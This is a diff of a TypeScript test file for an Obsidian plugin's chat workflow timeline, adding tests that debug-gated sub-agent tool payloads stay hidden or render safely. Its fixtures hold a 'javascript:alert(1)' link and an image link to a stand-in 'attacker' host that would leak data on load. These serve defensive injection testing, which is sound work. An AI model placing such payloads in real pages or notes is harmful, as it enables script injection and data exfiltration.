@@ -6,11 +6,14 @@ import { App, Component } from "obsidian";
 import { AdvancedSettingsSection } from "@apps/obsidian/ui/settings/AdvancedSettingsSection";
 import { createTranslator } from "@adapters/i18n";
 import {
+  captureWorkflowUiState,
   renderWorkflowTimeline,
   toParentWorkflowModel,
   toSubAgentWorkflowModel,
   WorkflowTimelineModel,
+  WorkflowUiState,
 } from "@apps/obsidian/ui/chat/workflow";
+import type { SubAgentWorkflowItem } from "@core/research";
 import type { ChatDisplayMessage } from "@core/conversation";
 import { createContainer, resetDom } from "../../support/domHarness";
 
@@ -42,38 +45,58 @@ function assistantWithToolCall(): ChatDisplayMessage {
   };
 }
 
-function childModel(isDebugMode: boolean): WorkflowTimelineModel {
-  return toSubAgentWorkflowModel(
-    "session-1",
-    [
-      {
-        id: "t1",
-        sessionId: "session-1",
-        runId: "run-1",
-        name: "search_index",
-        label: "Search",
-        sequence: 0,
-        round: 1,
-        status: "complete",
-        startedAt: "2026-01-01T00:00:00.000Z",
-        payloadState: isDebugMode ? "captured" : "disabled",
-        badge: { text: "keyword-only", tooltip: "Safe tooltip" },
-        ...(isDebugMode
-          ? {
-              args: { query: "vault notes", limit: 4242 },
-              resultJson: JSON.stringify({ hits: ["[x](javascript:alert(1)) private result"] }),
-            }
-          : {}),
-      },
-    ],
-    "complete",
-  );
+function childItem(overrides: Partial<SubAgentWorkflowItem> = {}): SubAgentWorkflowItem {
+  return {
+    id: "t1",
+    sessionId: "session-1",
+    runId: "run-1",
+    name: "search_index",
+    label: "Search",
+    sequence: 0,
+    round: 1,
+    status: "complete",
+    startedAt: "2026-01-01T00:00:00.000Z",
+    payloadState: "captured",
+    badge: { text: "keyword-only", tooltip: "Safe tooltip" },
+    args: { query: "vault notes", limit: 4242 },
+    resultJson: JSON.stringify({ hits: ["[x](javascript:alert(1)) private result"] }),
+    ...overrides,
+  };
+}
+
+function childModel(overrides: Partial<SubAgentWorkflowItem> = {}): WorkflowTimelineModel {
+  return toSubAgentWorkflowModel("session-1", [childItem(overrides)], "complete");
 }
 
 const adapters = {
   parent: () => toParentWorkflowModel(assistantWithToolCall()),
-  child: childModel,
+  child: () => childModel(),
 };
+
+function renderModel(
+  host: HTMLElement,
+  model: WorkflowTimelineModel,
+  isDebugMode: boolean,
+  options: {
+    onOpenToolOutput?: () => void;
+    viewerHost?: HTMLElement;
+    uiState?: WorkflowUiState;
+  } = {},
+) {
+  return renderWorkflowTimeline(
+    host,
+    model,
+    {
+      app: new App(),
+      markdownContext: new Component(),
+      isDebugMode,
+      t,
+      onOpenToolOutput: options.onOpenToolOutput ?? vi.fn(),
+      ...(options.viewerHost ? { outputViewerHost: options.viewerHost } : {}),
+    },
+    options.uiState,
+  );
+}
 
 function renderWorkflow(
   host: HTMLElement,
@@ -81,14 +104,16 @@ function renderWorkflow(
   adapter: keyof typeof adapters = "parent",
   onOpenToolOutput = vi.fn(),
 ) {
-  return renderWorkflowTimeline(host, adapters[adapter](isDebugMode), {
-    app: new App(),
-    markdownContext: new Component(),
-    isDebugMode,
-    t,
+  return renderModel(host, adapters[adapter](), isDebugMode, {
     onOpenToolOutput,
-    ...(adapter === "child" ? { outputViewerHost: host } : {}),
+    ...(adapter === "child" ? { viewerHost: host } : {}),
   });
+}
+
+function openFirstCell(host: HTMLElement): void {
+  host
+    .querySelector<HTMLElement>(".attest-chat__tool-cell")
+    ?.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
 }
 
 let container: HTMLElement;
@@ -110,6 +135,8 @@ describe("debug-mode gating of the workflow transcript", () => {
       expect(container.querySelectorAll(".attest-chat__tool-cell")).toHaveLength(0);
       expect(container.innerHTML).not.toContain("private result");
       expect(container.innerHTML).not.toContain("hits");
+      openFirstCell(container);
+      expect(container.querySelector(".attest-chat__tool-output-viewer")).toBeNull();
       const badge = container.querySelector(".attest-chat__tool-badge");
       if (adapter === "child") expect(badge?.getAttribute("title")).toBe("Safe tooltip");
     }
@@ -166,6 +193,70 @@ describe("debug-mode gating of the workflow transcript", () => {
 
     handle.dispose();
     handle.dispose();
+    expect(container.querySelector(".attest-chat__tool-output-viewer")).toBeNull();
+  });
+});
+
+describe("untrusted sub-agent payloads", () => {
+  it("renders child note content as literal code, never as Markdown", () => {
+    const content = "![x](https://attacker/?d=1) [[Some note]] ![[embed]]";
+    renderModel(
+      container,
+      childModel({ name: "create_note", label: "Create", args: { path: "a.md", content } }),
+      true,
+    );
+
+    const code = container.querySelector(".attest-chat__tool-cell--out code");
+    expect(code?.textContent).toBe(content);
+    expect(container.querySelector("img, a, .internal-link, .internal-embed")).toBeNull();
+  });
+
+  it("states a payload that was not captured in the node and the viewer", () => {
+    for (const payloadState of ["disabled", "evicted", "truncated", "captured"] as const) {
+      container.innerHTML = "";
+      renderModel(
+        container,
+        childModel({ payloadState, name: "create_note", args: { path: "a.md" } }),
+        true,
+        {
+          viewerHost: container,
+        },
+      );
+      const state = container.querySelector(".attest-chat__tool-payload-state")?.textContent;
+      if (payloadState === "captured") expect(state).toBeUndefined();
+      else expect(state).toBe(t(`chat.workflow.payload.${payloadState}`));
+    }
+
+    container.innerHTML = "";
+    renderModel(container, childModel({ payloadState: "evicted", args: { q: 1 } }), true, {
+      viewerHost: container,
+    });
+    openFirstCell(container);
+    const viewer = container.querySelector(".attest-chat__tool-output-viewer");
+    expect(viewer?.querySelector(".attest-chat__tool-payload-state")?.textContent).toBe(
+      t("chat.workflow.payload.evicted"),
+    );
+    expect(viewer?.querySelector("pre")?.textContent).toContain('"q": 1');
+  });
+
+  it("keeps the open child viewer across a rerender while debug stays on", () => {
+    const first = renderModel(container, childModel(), true, { viewerHost: container });
+    openFirstCell(container);
+    const uiState = captureWorkflowUiState(container);
+    first.dispose();
+    container.innerHTML = "";
+
+    const second = renderModel(container, childModel({ status: "failed" }), true, {
+      viewerHost: container,
+      uiState,
+    });
+    expect(
+      container.querySelector(".attest-chat__tool-output-viewer")?.getAttribute("data-output-key"),
+    ).toBe("sub-agent:session-1/run-1/t1");
+
+    second.dispose();
+    container.innerHTML = "";
+    renderModel(container, childModel(), false, { viewerHost: container, uiState });
     expect(container.querySelector(".attest-chat__tool-output-viewer")).toBeNull();
   });
 });
